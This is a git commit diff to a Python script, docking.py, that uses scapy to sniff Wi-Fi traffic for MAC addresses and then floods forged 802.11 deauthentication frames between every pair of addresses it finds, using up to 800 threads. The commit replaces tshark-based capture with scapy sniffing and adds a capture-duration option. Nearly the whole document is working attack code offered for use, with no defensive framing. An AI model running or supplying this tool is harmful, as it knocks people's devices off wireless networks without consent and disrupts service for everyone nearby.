fdf3d6e8ef01d4d137bc9d0367bfbef69c232ca1
Hisu Han <58086385+SHLEAK@users.noreply.github.com>
2023-05-27 00:13:49 +0900

    Update docking.py

--- docking.py
+++ docking.py
@@ -2,34 +2,33 @@ from scapy.all import *
 import argparse
 import concurrent.futures
 import re
-import subprocess
 import time
 def deauth(target_mac, access_point_mac, interface, packet_count, interval):
     print(f"deauth: router:{access_point_mac}, device:{target_mac}")
     conf.iface = interface
     pkt = RadioTap() / Dot11(addr1=target_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
     sendp(pkt, inter=interval, count=packet_count, verbose=0)
-def capture_mac_addresses(interface):
-    tshark_cmd = f"tshark -i {interface} -I -a duration:60"
-    with subprocess.Popen(tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) as tshark_process:
-        mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
-        mac_addresses = []
-        for line in iter(tshark_process.stdout.readline, b''):
-            line = line.decode('utf-8')
-            mac_matches = re.findall(mac_regex, line)
+def capture_mac_addresses(interface, duration):
+    packets = sniff(iface=interface, timeout=duration)
+    mac_regex = r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})"
+    mac_addresses = []
+    for packet in packets:
+        if packet.haslayer(Dot11):
+            addr = packet.addr2
+            mac_matches = re.findall(mac_regex, addr)
             if mac_matches:
                 mac_addresses.extend(mac_matches)
-        return set(mac_addresses)
+    return set(mac_addresses)
 def run_deauth_attacks(maccy, interface, packet_count, interval):
-    processed_combinations = set() 
+    processed_combinations = set()
     with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:
         for wifi in maccy:
             for device in maccy:
                 if wifi == device:
-                    continue 
+                    continue
                 combination = frozenset([wifi, device])
                 if combination in processed_combinations:
-                    continue 
+                    continue
                 try:
                     executor.submit(deauth, device, wifi, interface, packet_count, interval)
                     executor.submit(deauth, wifi, device, interface, packet_count, interval)
@@ -40,13 +39,10 @@ def main():
     parser = argparse.ArgumentParser(description='Perform deauthentication attacks on devices connected to a Wi-Fi network.')
     parser.add_argument('-i', '--interface', type=str, default='en0', help='Network interface to use for the attack (default: en0)')
     parser.add_argument('-c', '--count', type=int, default=40, help='Number of deauthentication packets to send per attack (default: 40)')
-    parser.add_argument('-d', '--interval', type=float, default=0.001, help='Interval between deauthentication packets (default: 0.001)')
+    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration (in seconds) to capture MAC addresses (default: 60)')
+    parser.add_argument('-l', '--interval', type=float, default=0.001, help='Interval between deauthentication packets (default: 0.001)')
     args = parser.parse_args()
-    disconnect_cmd = f"networksetup -setairportpower {args.interface} off"
-    subprocess.run(disconnect_cmd, shell=True)
-    disconnect_cmd = f"networksetup -setairportpower {args.interface} on"
-    subprocess.run(disconnect_cmd, shell=True)
-    mac_addresses = capture_mac_addresses(args.interface)
+    mac_addresses = capture_mac_addresses(args.interface, args.duration)
     run_deauth_attacks(mac_addresses, args.interface, args.count, args.interval)
 if __name__ == '__main__':
     main()
